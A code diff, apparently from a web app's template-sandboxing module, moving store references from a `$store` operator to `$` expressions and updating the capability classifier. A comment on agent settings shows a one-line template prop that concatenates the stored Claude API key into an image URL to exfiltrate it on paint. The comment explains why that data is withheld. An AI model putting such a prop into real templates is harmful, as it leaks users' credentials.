@@ -119,7 +119,7 @@ const WIRING = 'wiring' as const;
 
 interface MemberSpec {
   group: CapabilityGroup;
-  /** `state` is read through `$store` and tagged reactive; `action` is called through `$action`. */
+  /** `state` is read in expressions and tagged reactive; `action` is called through `$action`. */
   kind: 'state' | 'action';
   /**
    * Irreversible, or expensive to reverse. Not a grant of its own — a flag the host reads to decide
@@ -321,7 +321,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       Agent settings and the datasets that hold them.
 
       `agentSettings` carries `claudeApiKey`. Exposed, a template needed one styled element —
-      `bgImage: { $concat: ['https://…?k=', { $store: 'datasetStore.agentSettings.claudeApiKey' }] }`
+      `bgImage: { $: '`https://…?k=${datasetStore.agentSettings.claudeApiKey}`' }`
       — to exfiltrate it on paint. Any URL-valued prop is a network channel, so this is not fixable
       by watching for suspicious actions.
 
@@ -812,7 +812,7 @@ export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = 
       These were `WIRING`, on the reasoning that dock geometry is "the host's layout arithmetic,
       driven by a resize handle it owns". The arithmetic is the host's; the handle is not code. Docks
       are built as *schema* by `dockRegistry.dockFrame` — the geometry arrives through
-      `{ $store: 'shellStore.dockGeometry.<id>.<field>' }` and the drag through
+      `{ $: 'shellStore.dockGeometry.<id>.<field>' }` and the drag through
       `{ $action: 'shellStore.beginDockResize' }` — so marking them wiring removed them from every
       bag, chrome's included. Every docked panel rendered as empty space with no resize rail.
 
@@ -1004,7 +1004,7 @@ const ALWAYS_PRESENT = new Set([
   '$identities',
   '$ephemeral',
   /*
-    The `$source` registry — computed rows and values a template may draw on.
+    The host-source registry — computed rows and values a template may call on.
 
     Present in every bag for the same reason `$getModel` is: it is a host-provided capability that
     templates are meant to reach, not store state anyone needs protecting from. Its members are pure
@@ -1019,13 +1019,13 @@ const ALWAYS_PRESENT = new Set([
 ]);
 
 /**
- * Module stores, with every function tagged so `$store` can still read module state.
+ * Module stores, with every function tagged so an expression can still read module state.
  *
  * **This is deliberately permissive, and the one place the boundary is not yet drawn.** A module's
  * store is a flat record whose members are a mix of raw signals, derived closures and actions, and
  * nothing distinguishes them — so tagging selectively is not possible without the module saying
- * which is which. Tagging all of them keeps `{ $store: 'modules.transcribe.level' }` working and
- * leaves `{ $store: 'modules.call.leave' }` callable during paint, exactly as before.
+ * which is which. Tagging all of them keeps `{ $: 'modules.transcribe.level' }` working and
+ * leaves `modules.call.leave` callable during paint, exactly as before.
  *
  * The reason that is acceptable *today* is that modules are bundled: they are chosen by the
  * deployment's seed and ship with the app, at the same trust level as the app itself. It stops being
@@ -1075,7 +1075,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 
       `moduleStores` is one object the registry mutates in place as modules register and unregister,
       so copying its contents once would freeze the module set at whatever had loaded when this bag
-      was built — and `{ $store: 'modules.notes.open' }` is documented as the way a template depends
+      was built — and `{ $: 'modules.notes.open' }` is documented as the way a template depends
       on an optional module.
     */
     if (key === 'modules') {
@@ -1116,7 +1116,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 
       if (spec.kind === 'state') {
         // Tagged so `walkPath` will call it. Anything untagged is data to the resolver, never
-        // something to invoke — which is what stops a `$store` path from running an action.
+        // something to invoke — which is what stops a store read from running an action.
         filtered[name] = typeof member === 'function' ? markReactive(member) : member;
         continue;
       }
@@ -1154,7 +1154,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
  *
  * Because "resolves to nothing" is invisible. A synced space template referencing
  * `sessionStore.logout` renders a Sign out button that takes the click and does nothing, and a
- * `{ $store: 'runtimeStore.trustedAgents' }` renders an empty list rather than an error — a
+ * `{ $: 'runtimeStore.trustedAgents' }` renders an empty list rather than an error — a
  * template that is quietly half-broken, in a way neither its author nor the person looking at it
  * can see. Reading the references before accepting the template turns a silent hole into a
  * sentence, at install time, naming what it wanted.
@@ -1165,7 +1165,7 @@ export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, o
 export interface SurfaceReference {
   /** The store path as written — `sessionStore.logout`. */
   path: string;
-  /** How it was reached: through `$store` or through `$action`. */
+  /** How it was reached: read in an expression, or called through `$action`. */
   via: 'store' | 'action';
   /** The group it belongs to, or null when the member is not classified at all. */
   group: CapabilityGroup | null;
@@ -1204,7 +1204,7 @@ function classify(path: string): { store: string; member: string; spec: Classifi
 }
 
 /**
- * Walk any schema-shaped value, collecting every `$store` and `$action` reference.
+ * Walk any schema-shaped value, collecting every store read in an expression and every `$action`.
  *
  * Structural rather than typed on `SchemaNode`, because references live in props, in nested
  * operator objects, in `$each` items, in route trees and in handler arrays — everywhere. A walk
@@ -1219,12 +1219,11 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
   if (!value || typeof value !== 'object') return;
 
   const node = value as Record<string, unknown>;
-  if (typeof node.$store === 'string') into.push({ path: node.$store, via: 'store' });
   if (typeof node.$action === 'string') into.push({ path: node.$action, via: 'action' });
   /*
     An expression names stores as bare paths — `spaceStore.members`, `modules.notes.open`. Every
     dotted root the expression reads is reported as a store reference; roots that are not stores
-    (`local`, `item`, `me`) are dropped by `classify` below exactly as an ungated `$store` root is,
+    (`local`, `item`, `me`) are dropped by `classify` below exactly as an ungated store root is,
     so there is no second list of names to keep in step. A source that does not parse names
     nothing, which is right: it resolves to nothing at paint too, and the validator is where the
     syntax error is reported.
@@ -1240,7 +1239,7 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
   }
   /*
     A query's `dataset` is a store path too — `dataset: 'datasetStore.marketplaceDataset'` — and the
-    renderer resolves it against the same bag `$store` reads from. Left out of the walk, a dataset
+    renderer resolves it against the same bag expressions read from. Left out of the walk, a dataset
     the bag withholds is a query that quietly runs against nothing, which is how the marketplace
     shelf came to render empty with every check passing. A query object always carries `entity`,
     which is what tells this apart from any other prop that happens to be called `dataset`; the
@@ -1256,7 +1255,7 @@ function collectReferences(value: unknown, into: { path: string; via: 'store' | 
 /**
  * Inspect a template against a set of grants.
  *
- * A `$store` path may be deeper than `store.member` (`spaceStore.currentSpace.name`); only the
+ * A store path may be deeper than `store.member` (`spaceStore.currentSpace.name`); only the
  * first two segments decide access, which is exactly what the bag does — it filters members, and
  * everything below one travels with it.
  */
@@ -1281,7 +1280,7 @@ export function inspectTemplateSurface(schema: unknown, grants: readonly Capabil
     const parsed = classify(path);
     /*
       A root that is not a store at all — a `$each` variable, `local`, a name the expression bound.
-      Only an expression can produce one here (a `$store` path always starts with a store), and it
+      Only an expression can produce one here (a store path always starts with a store), and it
       is not a reference to anything the surface governs. A *typo'd* store name lands here too, and
       that is the validator's to report against the known store list, not this walker's — this
       answers "may you", not "does it exist".
